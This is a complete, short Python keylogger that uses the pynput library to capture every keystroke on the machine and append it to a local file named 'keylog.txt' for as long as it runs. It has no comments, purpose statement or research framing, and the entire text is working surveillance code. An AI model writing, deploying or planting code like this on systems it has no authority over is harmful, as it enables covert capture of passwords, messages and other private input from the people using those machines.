keys = []

from pynput import keyboard


def on_press(key):
    f = open('keylog.txt','a+')
    keys.append(key)
    f.write(str(key) + " ")
    f.close()

with keyboard.Listener(on_press = on_press) as listener:
    listener.join()
